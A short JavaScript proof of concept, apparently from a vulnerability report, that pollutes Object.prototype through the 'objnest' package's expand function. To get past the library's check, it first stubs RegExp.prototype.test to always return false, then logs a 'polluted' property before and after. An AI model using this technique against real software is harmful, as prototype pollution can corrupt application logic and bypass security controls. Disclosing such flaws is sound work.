RegExp.prototype.test = () => false;
const objnest = require('objnest');
let obj = {};
console.log({}.polluted);
objnest.expand({ 'constructor.prototype.polluted': 'yes' });
console.log({}.polluted);